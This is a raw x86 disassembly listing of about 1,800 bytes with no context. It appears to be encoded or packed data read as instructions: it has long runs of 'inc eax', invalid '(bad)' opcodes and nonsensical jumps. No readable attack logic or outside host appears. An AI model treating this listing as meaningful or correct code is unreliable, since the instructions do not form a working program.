  40e1c1:	xor    ah,cl
  40e1c3:	jecxz  0x40e1a4
  40e1c5:	add    eax,0xc4371186
  40e1ca:	push   cs
  40e1cb:	inc    ebp
  40e1cc:	rol    DWORD PTR [esi+0x476c6860],0xe7
  40e1d3:	mov    eax,ds:0x40e23441
  40e1d8:	inc    eax
  40e1d9:	inc    eax
  40e1da:	inc    eax
  40e1db:	inc    eax
  40e1dc:	inc    eax
  40e1dd:	int3   
  40e1de:	jne    0x40e220
  40e1e0:	mov    esp,0x4f2e8562
  40e1e5:	(bad)
  40e1e8:	or     eax,0xa5304341
  40e1ed:	retf   0x8605
  40e1f0:	jnp    0x40e253
  40e1f2:	nop
  40e1f3:	inc    ebx
  40e1f4:	dec    ebp
  40e1f5:	ret    0x7b86
  40e1f8:	mov    ah,0x99
  40e1fa:	ret    
  40e1fb:	mov    ebx,0xe12c69e5
  40e200:	inc    ecx
  40e201:	enter  0x4043,0x0
  40e205:	rol    DWORD PTR [eax+0x40],0x40
  40e209:	inc    eax
  40e20a:	add    BYTE PTR [eax-0x19],al
  40e20d:	dec    edx
  40e20e:	daa    
  40e20f:	mov    edi,0xd1511c05
  40e214:	inc    ebp
  40e215:	arpl   ax,ax
  40e217:	mov    edi,0x79cac486
  40e21c:	push   edx
  40e21d:	dec    esi
  40e21e:	mov    ebp,0xac6770bf
  40e223:	popf   
  40e224:	retf   0x2567
  40e227:	aas    
  40e228:	loopne 0x40e27c
  40e22a:	or     eax,0x933f5634
  40e22f:	lds    eax,FWORD PTR [eax+0x40]
  40e232:	inc    eax
  40e233:	inc    eax
  40e234:	inc    eax
  40e235:	inc    eax
  40e236:	inc    eax
  40e237:	inc    eax
  40e238:	inc    DWORD PTR [eax+0x5]
  40e23b:	xor    bl,cl
  40e23d:	int    0x2e
  40e23f:	leave  
  40e240:	rol    DWORD PTR [esi+0x41436286],0x20
  40e247:	addr16 inc esp
  40e249:	xor    eax,0x439a3c6e
  40e24e:	adc    BYTE PTR [esi+0x40],0x40
  40e252:	inc    eax
  40e253:	inc    eax
  40e254:	inc    eax
  40e255:	inc    eax
  40e256:	inc    eax
  40e257:	inc    eax
  40e258:	inc    eax
  40e259:	inc    eax
  40e25a:	shr    BYTE PTR [esi-0x21],0x65
  40e25e:	mov    eax,0x33239330
  40e263:	inc    eax
  40e264:	add    eax,0x41c0ddfd
  40e269:	in     eax,dx
  40e26a:	rcr    BYTE PTR ds:0x47f0cc86,cl
  40e270:	adc    esp,DWORD PTR [edx+0x627918c7]
  40e276:	bound  eax,QWORD PTR [ebp+0x63042e24]
  40e27c:	faddp  st(4),st
  40e27e:	inc    esp
  40e27f:	inc    eax
  40e280:	inc    eax
  40e281:	inc    eax
  40e282:	inc    eax
  40e283:	inc    eax
  40e284:	inc    eax
  40e285:	inc    eax
  40e286:	inc    eax
  40e287:	add    BYTE PTR [ebx-0x9],al
  40e28a:	pop    eax
  40e28b:	rol    BYTE PTR [esi-0x6f76b0fb],0x2c
  40e292:	sub    DWORD PTR [eax+0x21],ebp
  40e295:	xchg   BYTE PTR [ecx+eax*8-0x20],al
  40e299:	data16 jecxz 0x40e2dc
  40e29c:	mov    edi,0x43510260
  40e2a1:	ds loope 0x40e2d0
  40e2a4:	mov    edi,0x40eb6add
  40e2a9:	inc    eax
  40e2aa:	inc    eax
  40e2ab:	inc    eax
  40e2ac:	inc    eax
  40e2ad:	inc    eax
  40e2ae:	and    eax,0xd1404040
  40e2b3:	retf   0x1fd0
  40e2b6:	mov    edi,0x1e668b05
  40e2bb:	inc    ebx
  40e2bc:	and    DWORD PTR [ecx],ecx
  40e2be:	cmp    eax,0x2d349a86
  40e2c3:	push   ebp
  40e2c4:	dec    ecx
  40e2c5:	(bad)  
  40e2c6:	lds    eax,FWORD PTR ds:0x9a426062
  40e2cc:	mov    ds:0xc2dc866f,al
  40e2d1:	mov    ds:0x40afaeba,al
  40e2d6:	inc    eax
  40e2d7:	inc    eax
  40e2d8:	inc    eax
  40e2d9:	inc    eax
  40e2da:	inc    eax
  40e2db:	inc    eax
  40e2dc:	inc    eax
  40e2dd:	inc    eax
  40e2de:	inc    eax
  40e2df:	dec    ebp
  40e2e0:	es add eax,0x4841c3bc
  40e2e6:	xor    eax,esi
  40e2e8:	inc    esi
  40e2e9:	xchg   BYTE PTR ds:0x41c543bd,dl
  40e2ef:	outs   dx,DWORD PTR ds:[esi]
  40e2f0:	sub    eax,0x30152409
  40e2f5:	dec    edi
  40e2f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2f7:	cmp    ebp,esp
  40e2f9:	(bad)  [edx]
  40e2fb:	idiv   BYTE PTR [eax+eax*4]
  40e2fe:	sub    al,al
  40e300:	arpl   WORD PTR ds:0x40404040,ax
  40e306:	inc    eax
  40e307:	inc    eax
  40e308:	rol    DWORD PTR [eax+0x40],0x49
  40e30c:	dec    edi
  40e30d:	inc    edi
  40e30e:	cs inc ecx
  40e310:	xor    al,BYTE PTR [esi-0x7a900f7a]
  40e316:	test   eax,0x13253f61
  40e31b:	pop    esp
  40e31c:	stos   DWORD PTR es:[edi],eax
  40e31d:	inc    ebx
  40e31e:	and    edx,DWORD PTR [edi+0x40]
  40e321:	inc    eax
  40e322:	add    BYTE PTR [eax+0x40],al
  40e325:	inc    eax
  40e326:	inc    eax
  40e327:	inc    eax
  40e328:	inc    eax
  40e329:	sar    BYTE PTR [edi],0xda
  40e32c:	inc    esp
  40e32d:	lods   al,BYTE PTR ds:[esi]
  40e32e:	nop
  40e32f:	shl    BYTE PTR [ecx],cl
  40e331:	adc    eax,0xd010522
  40e336:	std    
  40e337:	add    BYTE PTR [ecx+0x6e],bl
  40e33a:	bound  eax,QWORD PTR [eax+0x40]
  40e33d:	inc    eax
  40e33e:	inc    eax
  40e33f:	inc    eax
  40e340:	inc    eax
  40e341:	inc    eax
  40e342:	inc    eax
  40e343:	inc    eax
  40e344:	inc    eax
  40e345:	xchg   BYTE PTR [edi-0x37],ah
  40e348:	inc    edi
  40e349:	add    al,0x63
  40e34b:	pop    eax
  40e34c:	lds    ecx,FWORD PTR ds:0xd2c54413
  40e352:	in     eax,0xc0
  40e354:	xchg   cl,bl
  40e356:	pop    eax
  40e357:	adc    DWORD PTR [esi-0x26],0x52429e3
  40e35e:	push   ecx
  40e35f:	ret    
  40e360:	add    esp,DWORD PTR [eax]
  40e362:	aas    
  40e363:	add    BYTE PTR [edi-0x3553217a],bh
  40e369:	dec    esi
  40e36a:	popa   
  40e36b:	inc    eax
  40e36c:	inc    eax
  40e36d:	inc    eax
  40e36e:	inc    eax
  40e36f:	inc    eax
  40e370:	inc    eax
  40e371:	int3   
  40e372:	jne    0x40e3b4
  40e374:	sar    BYTE PTR [edi+0x600d4060],0xa6
  40e37b:	pop    ds
  40e37c:	and    eax,0xcb38d8bf
  40e381:	inc    ecx
  40e382:	fisttp WORD PTR [edx+0x4a]
  40e385:	inc    eax
  40e386:	add    cl,al
  40e388:	inc    eax
  40e389:	inc    eax
  40e38a:	inc    eax
  40e38b:	inc    eax
  40e38c:	add    BYTE PTR [eax+0x3a],al
  40e38f:	add    eax,0x14435061
  40e394:	mov    eax,ds:0x8c86c5c0
  40e399:	inc    ebx
  40e39a:	xor    BYTE PTR [eax+0x7b862955],al
  40e3a0:	push   eax
  40e3a1:	inc    eax
  40e3a2:	int3   
  40e3a3:	push   ds
  40e3a4:	and    esp,DWORD PTR [ebp+0x3b]
  40e3a7:	xlat   BYTE PTR ds:[ebx]
  40e3a8:	mov    al,0x46
  40e3aa:	inc    edi
  40e3ab:	stos   BYTE PTR es:[edi],al
  40e3ac:	push   eax
  40e3ad:	sar    BYTE PTR [edi+0x40404040],0x40
  40e3b4:	inc    eax
  40e3b5:	inc    eax
  40e3b6:	inc    eax
  40e3b7:	inc    DWORD PTR [eax+0x5]
  40e3ba:	inc    ecx
  40e3bb:	in     al,0x85
  40e3bd:	and    edx,DWORD PTR es:0x6e9486bf
  40e3c4:	inc    ebx
  40e3c5:	clc    
  40e3c6:	dec    esp
  40e3c7:	sub    DWORD PTR [eax+0x40],eax
  40e3ca:	inc    eax
  40e3cb:	inc    eax
  40e3cc:	inc    eax
  40e3cd:	inc    eax
  40e3ce:	inc    eax
  40e3cf:	inc    eax
  40e3d0:	inc    eax
  40e3d1:	inc    eax
  40e3d2:	mov    edi,0x90637625
  40e3d7:	adc    esp,DWORD PTR [ebp-0x5729c67e]
  40e3dd:	sub    al,0x9a
  40e3df:	rcl    BYTE PTR [ebp-0x40],0xc5
  40e3e3:	inc    eax
  40e3e4:	inc    eax
  40e3e5:	inc    eax
  40e3e6:	inc    eax
  40e3e7:	inc    eax
  40e3e8:	inc    eax
  40e3e9:	inc    eax
  40e3ea:	inc    eax
  40e3eb:	add    BYTE PTR ds:0xa1a88a62,al
  40e3f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3f2:	outs   dx,BYTE PTR ds:[esi]
  40e3f3:	xchg   BYTE PTR [esi+0x6d40c173],al
  40e3f9:	ins    BYTE PTR es:[edi],dx
  40e3fa:	dec    edx
  40e3fb:	pusha  
  40e3fc:	sub    al,0x89
  40e3fe:	push   eax
  40e3ff:	sub    dl,BYTE PTR ds:0xd54ec1ab
  40e405:	stos   DWORD PTR es:[edi],eax
  40e406:	test   BYTE PTR [edi+0x62],0x5f
  40e40a:	inc    eax
  40e40b:	pop    ss
  40e40c:	add    eax,0x3c2a6824
  40e411:	inc    eax
  40e412:	inc    eax
  40e413:	inc    eax
  40e414:	inc    eax
  40e415:	inc    eax
  40e416:	inc    eax
  40e417:	and    eax,0x61404040
  40e41c:	ror    BYTE PTR [esi+eax*4],0x53
  40e420:	add    ecx,edi
  40e422:	push   0x22636f3d
  40e427:	gs xchg ecx,eax
  40e429:	test   DWORD PTR ds:0xd4864523,0xaf4c62bc
  40e433:	mov    edi,0x400534c0
  40e438:	inc    eax
  40e439:	inc    eax
  40e43a:	inc    eax
  40e43b:	inc    eax
  40e43c:	inc    eax
  40e43d:	inc    eax
  40e43e:	inc    eax
  40e43f:	inc    eax
  40e440:	inc    eax
  40e441:	inc    ecx
  40e442:	mov    ebp,0x3056505e
  40e447:	mov    edi,0x4722bd86
  40e44c:	outs   dx,BYTE PTR ds:[esi]
  40e44d:	bound  ebx,QWORD PTR [edx]
  40e44f:	mov    edi,0x43856b29
  40e454:	nop
  40e455:	stos   BYTE PTR es:[edi],al
  40e456:	inc    eax
  40e457:	mov    edi,0x404040d3
  40e45c:	inc    eax
  40e45d:	inc    eax
  40e45e:	inc    eax
  40e45f:	rol    DWORD PTR [eax+0x40],0x48
  40e463:	pop    edx
  40e464:	xor    BYTE PTR [edx+0x40],al
  40e467:	shl    BYTE PTR [edi],0x5
  40e46a:	in     al,dx
  40e46b:	mov    WORD PTR [eax],?
  40e46d:	and    eax,0x86c5342d
  40e472:	sub    eax,ecx
  40e474:	inc    edi
  40e475:	jl     0x40e4df
  40e477:	dec    esi
  40e478:	inc    eax
  40e479:	inc    eax
  40e47a:	add    BYTE PTR [eax+0x40],al
  40e47d:	inc    eax
  40e47e:	inc    eax
  40e47f:	inc    eax
  40e480:	inc    eax
  40e481:	xchg   BYTE PTR [edi+ecx*2],dh
  40e484:	dec    eax
  40e485:	test   edi,eax
  40e487:	gs ret 0xd225
  40e48b:	mov    ebp,0xae60ca
  40e490:	jp     0x40e4d8
  40e492:	add    eax,0x4af04366
  40e497:	out    0x79,al
  40e499:	xchg   BYTE PTR fs:[ecx+0x40],al
  40e49d:	inc    eax
  40e49e:	inc    eax
  40e49f:	inc    eax
  40e4a0:	inc    eax
  40e4a1:	inc    eax
  40e4a2:	inc    eax
  40e4a3:	inc    eax
  40e4a4:	inc    eax
  40e4a5:	inc    eax
  40e4a6:	pop    ss
  40e4a7:	call   0xbd21:0xfcc4030a
  40e4ae:	push   0xffffffb7
  40e4b0:	push   edx
  40e4b1:	inc    ebp
  40e4b2:	sub    BYTE PTR [ebx-0x2f],dl
  40e4b5:	jo     0x40e4fb
  40e4b7:	inc    ebx
  40e4b8:	cwde   
  40e4b9:	and    DWORD PTR [edx],eax
  40e4bb:	xchg   BYTE PTR ds:0x40d2884d,al
  40e4c1:	inc    eax
  40e4c2:	inc    eax
  40e4c3:	inc    eax
  40e4c4:	inc    eax
  40e4c5:	inc    eax
  40e4c6:	int3   
  40e4c7:	jne    0x40e509
  40e4c9:	inc    ebx
  40e4ca:	int    0xc0
  40e4cc:	xor    eax,DWORD PTR [esi+0x5a5504c]
  40e4d2:	test   DWORD PTR [esi],esp
  40e4d4:	mov    edi,0x598a5e30
  40e4d9:	gs arpl dx,bp
  40e4dc:	mov    edi,0x4041d0
  40e4e1:	rol    DWORD PTR [eax+0x40],0x40
  40e4e5:	inc    eax
  40e4e6:	add    BYTE PTR [eax+0x63],al
  40e4e9:	pop    ebp
  40e4ea:	rcr    BYTE PTR [ebx],1
  40e4ec:	inc    edx
  40e4ed:	mov    edi,0x6434bc05
  40e4f2:	out    0xe1,eax
  40e4f4:	shl    DWORD PTR ds:0x41426c86,0xaa
  40e4fb:	adc    ah,BYTE PTR [edx-0x3b]
  40e4fe:	sub    eax,0xb43508b
  40e503:	pusha  
  40e504:	inc    eax
  40e505:	inc    eax
  40e506:	inc    eax
  40e507:	inc    eax
  40e508:	inc    eax
  40e509:	inc    eax
  40e50a:	inc    eax
  40e50b:	inc    eax
  40e50c:	inc    DWORD PTR [eax-0x3d]
  40e50f:	xchg   bh,cl
  40e511:	test   al,0xeb
  40e513:	xor    bh,cl
  40e515:	and    eax,0x12056f76
  40e51a:	inc    ebx
  40e51b:	xor    al,0x17
  40e51d:	sub    al,0x40
  40e51f:	inc    eax
  40e520:	inc    eax
  40e521:	inc    eax
  40e522:	inc    eax
  40e523:	inc    eax
  40e524:	inc    eax
  40e525:	inc    eax
  40e526:	inc    eax
  40e527:	inc    eax
  40e528:	ret    0x8646
  40e52b:	push   ebp
  40e52c:	in     al,0x47
  40e52e:	and    DWORD PTR cs:[eax+0x31],esp
  40e532:	das    
  40e533:	inc    ecx
  40e534:	outs   dx,BYTE PTR ds:[esi]
  40e535:	test   ecx,ecx
  40e537:	dec    edx
  40e538:	outs   dx,BYTE PTR ds:[esi]
  40e539:	clc    
  40e53a:	into   
  40e53b:	dec    edi
  40e53c:	inc    edx
  40e53d:	inc    ebx
  40e53e:	jmp    0x5a4a7a4
  40e543:	mov    esp,0x60499040
  40e548:	adc    eax,DWORD PTR [esi+0x40404786]
  40e54e:	inc    eax
  40e54f:	inc    eax
  40e550:	inc    eax
  40e551:	inc    eax
  40e552:	inc    eax
  40e553:	inc    eax
  40e554:	add    BYTE PTR [edx+0x54],ch
  40e557:	adc    DWORD PTR [ebx+0x67],esp
  40e55a:	pusha  
  40e55b:	and    ebp,esp
  40e55d:	dec    eax
  40e55e:	inc    ebx
  40e55f:	ror    DWORD PTR [eax-0x1232403c],1
  40e565:	mov    ecx,edx
  40e567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e568:	and    DWORD PTR [esi],ebp
  40e56a:	mov    edi,0x40404105
  40e56f:	inc    eax
  40e570:	inc    eax
  40e571:	inc    eax
  40e572:	inc    eax
  40e573:	and    eax,0xc3404040
  40e578:	sub    al,0x6
  40e57a:	scas   eax,DWORD PTR es:[edi]
  40e57b:	stos   BYTE PTR es:[edi],al
  40e57c:	mov    edi,0x8058bd86
  40e581:	es pop ebp
  40e583:	xor    ebp,DWORD PTR fs:[eax+0x6d]
  40e587:	or     BYTE PTR [eax+0x40],al
  40e58a:	inc    eax
  40e58b:	inc    eax
  40e58c:	inc    eax
  40e58d:	inc    eax
  40e58e:	inc    eax
  40e58f:	inc    eax
  40e590:	inc    eax
  40e591:	inc    eax
  40e592:	fcom   DWORD PTR [ebp+eiz*2+0x15ccc5c0]
  40e599:	inc    edx
  40e59a:	mov    ch,0x2c
  40e59c:	dec    edx
  40e59d:	mov    dh,0x86
  40e59f:	add    eax,0x40404154
  40e5a4:	inc    eax
  40e5a5:	inc    eax
  40e5a6:	inc    eax
  40e5a7:	inc    eax
  40e5a8:	rol    DWORD PTR [eax+0x40],0x41
  40e5ac:	frstor [ecx-0x35]
  40e5af:	xor    al,0x86
  40e5b1:	bound  edi,QWORD PTR [eax]
  40e5b3:	inc    ebx
  40e5b4:	rol    BYTE PTR ss:[bp+0x60],0x28
  40e5ba:	pop    esp
  40e5bb:	xor    BYTE PTR [edx-0x60],ah
  40e5be:	pusha  
  40e5bf:	pop    ss
  40e5c0:	retf   
  40e5c1:	inc    eax
  40e5c2:	inc    eax
  40e5c3:	add    BYTE PTR [eax+0x40],al
  40e5c6:	inc    eax
  40e5c7:	inc    eax
  40e5c8:	inc    eax
  40e5c9:	inc    eax
  40e5ca:	sub    BYTE PTR [ebx+0x3a35c930],ch
  40e5d0:	je     0x40e5d7
  40e5d2:	inc    eax
  40e5d3:	push   esp
  40e5d4:	inc    edi
  40e5d5:	push   ecx
  40e5d6:	pop    esp
  40e5d7:	into   
  40e5d8:	inc    eax
  40e5d9:	inc    eax
  40e5da:	inc    eax
  40e5db:	inc    eax
  40e5dc:	inc    eax
  40e5dd:	inc    eax
  40e5de:	inc    eax
  40e5df:	inc    eax
  40e5e0:	inc    eax
  40e5e1:	inc    eax
  40e5e2:	arpl   WORD PTR [esi-0x4e7aa6bf],ax
  40e5e8:	loop   0x40e5fd
  40e5ea:	xchg   BYTE PTR [eax-0x7a],dh
  40e5ed:	scas   eax,DWORD PTR es:[edi]
  40e5ee:	inc    ebx
  40e5ef:	inc    eax
  40e5f0:	inc    eax
  40e5f1:	inc    eax
  40e5f2:	inc    eax
  40e5f3:	inc    eax
  40e5f4:	inc    eax
  40e5f5:	int3   
  40e5f6:	jne    0x40e638
  40e5f8:	dec    esp
  40e5f9:	and    esp,DWORD PTR [ecx+ebp*1]
  40e5fc:	retf   0x42b4
  40e5ff:	nop
  40e600:	mov    esi,0x5bfcf62
  40e605:	inc    ecx
  40e606:	and    al,0x71
  40e608:	stos   DWORD PTR es:[edi],eax
  40e609:	loope  0x40e668
  40e60b:	mov    edi,0x43eda786
  40e610:	mov    esi,0x40bfc1ec
  40e615:	add    cl,al
  40e617:	inc    eax
  40e618:	inc    eax
  40e619:	inc    eax
  40e61a:	inc    eax
  40e61b:	add    BYTE PTR [eax+0x6e],al
  40e61e:	fs test al,0xd1
  40e621:	jno    0x40e644
  40e623:	jmp    0x40e656
  40e625:	leave  
  40e626:	arpl   WORD PTR [eax+0x4b],cx
  40e629:	(bad)  [ebx-0x74fa3af3]
  40e62f:	inc    eax
  40e630:	xchg   esp,eax
  40e631:	cmp    al,0x50
  40e633:	int    0x86
  40e635:	xchg   BYTE PTR [ebx+0x21284489],ch
  40e63b:	ss inc eax
  40e63d:	inc    eax
  40e63e:	inc    eax
  40e63f:	inc    eax
  40e640:	inc    eax
  40e641:	inc    eax
  40e642:	inc    eax
  40e643:	inc    eax
  40e644:	inc    DWORD PTR [eax+0x24]
  40e647:	jne    0x40e699
  40e649:	shl    edi,0xd2
  40e64c:	xor    ecx,ecx
  40e64e:	inc    esi
  40e64f:	enter  0x41c8,0x41
  40e653:	pop    edi
  40e654:	in     eax,0x69
  40e656:	pop    ss
  40e657:	add    eax,0xca434bbc
  40e65c:	inc    ebp
  40e65d:	inc    ebx
  40e65e:	ins    BYTE PTR es:[edi],dx
  40e65f:	xchg   BYTE PTR [eax+0x40],al
  40e662:	inc    eax
  40e663:	inc    eax
  40e664:	inc    eax
  40e665:	inc    eax
  40e666:	inc    eax
  40e667:	inc    eax
  40e668:	inc    eax
  40e669:	inc    eax
  40e66a:	add    eax,0xe0d030fc
  40e66f:	inc    edi
  40e670:	bound  ebp,QWORD PTR [edi+0x43]
  40e673:	popa   
  40e674:	sub    al,0xeb
  40e676:	and    DWORD PTR [eax-0x3b],eax
  40e679:	(bad)  
  40e67a:	mov    eax,0x5ae94734
  40e67f:	inc    eax
  40e680:	inc    eax
  40e681:	inc    eax
  40e682:	inc    eax
  40e683:	inc    eax
  40e684:	inc    eax
  40e685:	inc    eax
  40e686:	inc    eax
  40e687:	add    BYTE PTR [edx],dh
  40e689:	xchg   BYTE PTR ds:0xaf854805,al
  40e68f:	mov    eax,ds:0xcb862541
  40e694:	mov    ds:0x40404040,al
  40e699:	inc    eax
  40e69a:	inc    eax
  40e69b:	and    eax,0x43404040
  40e6a0:	dec    esp
  40e6a1:	inc    ebx
  40e6a2:	inc    eax
  40e6a3:	mov    edi,0x90c32121
  40e6a8:	popa   
  40e6a9:	loope  0x40e6d1
  40e6ab:	mov    edi,0x40404040
  40e6b0:	inc    eax
  40e6b1:	inc    eax
  40e6b2:	inc    eax
  40e6b3:	inc    eax
  40e6b4:	inc    eax
  40e6b5:	inc    eax
  40e6b6:	mov    BYTE PTR [edx-0x312bf1a8],0x3d
  40e6bd:	mov    edi,0x4311c305
  40e6c2:	fsub   DWORD PTR [ebx]
  40e6c4:	inc    eax
  40e6c5:	das    
  40e6c6:	xchg   BYTE PTR [ecx+0x634bd144],bh
  40e6cc:	mov    ch,0xc5
  40e6ce:	sub    al,0xb7
  40e6d0:	inc    eax
  40e6d1:	inc    eax
  40e6d2:	inc    eax
  40e6d3:	inc    eax
  40e6d4:	inc    eax
  40e6d5:	inc    eax
  40e6d6:	rol    DWORD PTR [eax+0x40],0x41
  40e6da:	mov    edi,0x86282051
  40e6df:	lds    eax,FWORD PTR [eax+0x38]
  40e6e2:	inc    eax
  40e6e3:	inc    edx
  40e6e4:	scas   eax,DWORD PTR es:[edi]
  40e6e5:	adc    esp,DWORD PTR [eax*1+0x40400840]
  40e6ec:	add    BYTE PTR [eax+0x40],al
  40e6ef:	inc    eax
  40e6f0:	inc    eax
  40e6f1:	inc    eax
  40e6f2:	inc    eax
  40e6f3:	icebp  
  40e6f4:	in     eax,0x25
  40e6f6:	inc    ebx
  40e6f7:	inc    edi
  40e6f8:	xchg   BYTE PTR [eax+0x64],al
  40e6fb:	mov    dh,0x7a
  40e6fd:	dec    eax
  40e6fe:	pop    ecx
  40e6ff:	pop    ss
  40e700:	sub    al,0x5a
  40e702:	lods   eax,DWORD PTR ds:[esi]
  40e703:	inc    ecx
  40e704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e705:	mov    eax,ds:0xf9c46440
  40e70a:	lods   al,BYTE PTR ds:[esi]
  40e70b:	inc    ebx
  40e70c:	xor    BYTE PTR [ecx+0x24],al
  40e70f:	bound  eax,QWORD PTR ds:0x863015d9
  40e715:	mov    eax,ds:0x4040c5fd
  40e71a:	inc    eax
  40e71b:	inc    eax
  40e71c:	inc    eax
  40e71d:	inc    eax
  40e71e:	inc    eax
  40e71f:	inc    eax
  40e720:	inc    eax
  40e721:	inc    eax
  40e722:	xchg   BYTE PTR [eax+0x41],cl
  40e725:	sub    BYTE PTR [ecx+0x298644c7],cl
  40e72b:	inc    esp
  40e72c:	cmp    al,BYTE PTR [edi-0x3c]
  40e72f:	and    al,BYTE PTR fs:[eax+0x40]
  40e733:	inc    eax
  40e734:	inc    eax
  40e735:	inc    eax
  40e736:	inc    eax
  40e737:	int3   
  40e738:	jne    0x40e77a
  40e73a:	and    eax,ebx
  40e73c:	inc    eax
  40e73d:	pop    eax
  40e73e:	test   DWORD PTR ds:0x5bf402e,ebp
  40e744:	cmc    
  40e745:	adc    BYTE PTR [ebx-0x40],al
  40e748:	das    
  40e749:	mov    esp,0xc9dc86bf
  40e74e:	nop
  40e74f:	jns    0x40e734
  40e751:	sub    BYTE PTR [edi+0x2b135f3a],bh
  40e757:	jae    0x40e79e
  40e759:	adc    eax,0xc100402d
  40e75e:	inc    eax
  40e75f:	inc    eax
  40e760:	inc    eax
  40e761:	inc    eax
  40e762:	add    BYTE PTR [eax-0x3e],al
  40e765:	adc    BYTE PTR [ebx],0x43
  40e768:	add    eax,0x5c54321
  40e76d:	pop    edx
  40e76e:	(bad)
  40e773:	xchg   BYTE PTR [esi-0xe0f7580],al
  40e779:	mov    eax,ds:0x1c2f2241
  40e77e:	ret    
  40e77f:	jmp    0xbf801ec6
  40e784:	rcl    DWORD PTR [edx+0x60],0xfd
  40e788:	jp     0x40e7d9
  40e78a:	inc    eax
  40e78b:	inc    eax
  40e78c:	inc    eax
  40e78d:	inc    eax
  40e78e:	inc    eax
  40e78f:	inc    eax
  40e790:	inc    eax
  40e791:	inc    eax
  40e792:	inc    DWORD PTR [eax+0x40]
  40e795:	mov    edi,0x7af62805
  40e79a:	push   ebx
  40e79b:	mov    eax,ds:0x6486bf21
  40e7a0:	pop    esi
  40e7a1:	inc    ecx
  40e7a2:	adc    DWORD PTR [ecx-0x29],ecx
  40e7a5:	sub    al,0xd
  40e7a7:	cmp    eax,0x61634334
  40e7ac:	inc    edx
  40e7ad:	(bad)
  40e7b0:	inc    eax
  40e7b1:	inc    eax
  40e7b2:	inc    eax
  40e7b3:	inc    eax
  40e7b4:	inc    eax
  40e7b5:	inc    eax
  40e7b6:	inc    eax
  40e7b7:	inc    eax
  40e7b8:	inc    eax
  40e7b9:	inc    eax
  40e7ba:	push   eax
  40e7bb:	xor    cl,bl
  40e7bd:	push   edi
  40e7be:	pop    es
  40e7bf:	xchg   BYTE PTR ds:0x5624a041,al
  40e7c5:	and    DWORD PTR [eax+0x40],eax
  40e7c8:	xchg   BYTE PTR [eax+0x40404040],dl
  40e7ce:	inc    eax
  40e7cf:	inc    eax
  40e7d0:	inc    eax
  40e7d1:	inc    eax
  40e7d2:	add    BYTE PTR [ecx+0x47],al
  40e7d5:	pop    esi
  40e7d6:	inc    edx
  40e7d7:	dec    edx
  40e7d8:	xchg   ecx,eax
  40e7d9:	inc    eax
  40e7da:	add    al,0x4a
  40e7dc:	test   DWORD PTR [ebp-0x60],esi
  40e7df:	test   al,0x5
  40e7e1:	inc    eax
  40e7e2:	inc    ebx
  40e7e3:	mov    BYTE PTR [ebx+0x5c],al
  40e7e6:	sub    eax,0x50428640
  40e7eb:	cmp    dl,BYTE PTR [eax+0x2f4d2472]
  40e7f1:	inc    eax
  40e7f2:	and    al,0x40
  40e7f4:	inc    eax
  40e7f5:	inc    eax
  40e7f6:	inc    eax
  40e7f7:	inc    eax
  40e7f8:	inc    eax
  40e7f9:	and    eax,0x34404040
  40e7fe:	enter  0xe9de,0x40
  40e802:	nop
  40e803:	lds    edi,FWORD PTR [eax]
  40e805:	inc    esp
  40e806:	inc    ebx
  40e807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e808:	pop    es
  40e809:	outs   dx,BYTE PTR ds:[esi]
  40e80a:	add    eax,0xd154c84f
  40e80f:	xchg   esp,eax
  40e810:	popa   
  40e811:	inc    ebx
  40e812:	xchg   BYTE PTR [ecx-0x5ffb1c70],dl
  40e818:	inc    ebx
  40e819:	inc    eax
  40e81a:	push   cs
  40e81b:	inc    eax
  40e81c:	pop    es
  40e81d:	lods   al,BYTE PTR ds:[esi]
  40e81e:	cmp    eax,0x8f3a60be
  40e823:	inc    eax
  40e824:	inc    eax
  40e825:	inc    eax
  40e826:	inc    eax
  40e827:	inc    eax
  40e828:	inc    eax
  40e829:	inc    eax
  40e82a:	inc    eax
  40e82b:	inc    eax
  40e82c:	inc    eax
  40e82d:	inc    eax
  40e82e:	xor    al,0x5
  40e830:	dec    eax
  40e831:	cli    
  40e832:	mov    bh,0x59
  40e834:	add    eax,0x2bc9f91e
  40e839:	loopne 0x40e85e
  40e83b:	inc    eax
  40e83c:	xchg   BYTE PTR [eax+0x71414432],al
  40e842:	inc    esi
  40e843:	mov    esp,0x41b86260
  40e848:	inc    ebx
  40e849:	mov    ds:0x40404040,eax
  40e84e:	inc    eax
  40e84f:	inc    eax
  40e850:	rol    DWORD PTR [eax+0x40],0x61
  40e854:	dec    edx
  40e855:	mov    es,ebx
  40e857:	add    eax,0x19bf304c
  40e85c:	xor    eax,0x98c93205
  40e861:	and    BYTE PTR [edx],ah
  40e863:	popa   
  40e864:	inc    ecx
  40e865:	xchg   BYTE PTR [eax+0x40],al
  40e868:	add    BYTE PTR [eax+0x40],al
  40e86b:	inc    eax
  40e86c:	inc    eax
  40e86d:	inc    eax
  40e86e:	inc    eax
  40e86f:	sbb    DWORD PTR [ecx+ecx*8+0x47],eax
  40e873:	gs push edx
  40e875:	jno    0x40e89b
  40e877:	bound  eax,QWORD PTR [ecx+0x51]
  40e87a:	test   DWORD PTR [edx-0x1f],ecx
  40e87d:	inc    ecx
  40e87e:	lea    ecx,[ecx]
  40e880:	ret    0x43cb
  40e883:	test   al,0x20
  40e885:	arpl   WORD PTR ds:0x904138c8,ax
  40e88b:	add    ch,ah
  40e88d:	inc    eax
  40e88e:	xchg   BYTE PTR [eax-0x74],ch
  40e891:	jecxz  0x40e878
  40e893:	inc    eax
  40e894:	inc    eax
  40e895:	inc    eax
  40e896:	inc    eax
  40e897:	inc    eax
  40e898:	inc    eax
  40e899:	inc    eax
  40e89a:	inc    eax
  40e89b:	inc    eax
  40e89c:	inc    eax
  40e89d:	mov    bl,0x25
  40e89f:	pusha  
  40e8a0:	and    eax,0x436aabc0
  40e8a5:	xchg   esi,eax
  40e8a6:	in     eax,0x41
  40e8a8:	mov    WORD PTR [eax+ebp*4],fs
  40e8ab:	push   eax
  40e8ac:	rcr    DWORD PTR [ebp+eax*8+0x12620540],1
  40e8b3:	mov    DWORD PTR [ebp-0x79d3c86c],esi
  40e8b9:	inc    edx
  40e8ba:	dec    ebx
  40e8bb:	ret    
  40e8bc:	icebp  
  40e8bd:	and    ebx,DWORD PTR [ecx]
  40e8bf:	inc    eax
  40e8c0:	inc    eax
  40e8c1:	inc    eax
  40e8c2:	inc    eax
  40e8c3:	inc    eax
  40e8c4:	inc    eax
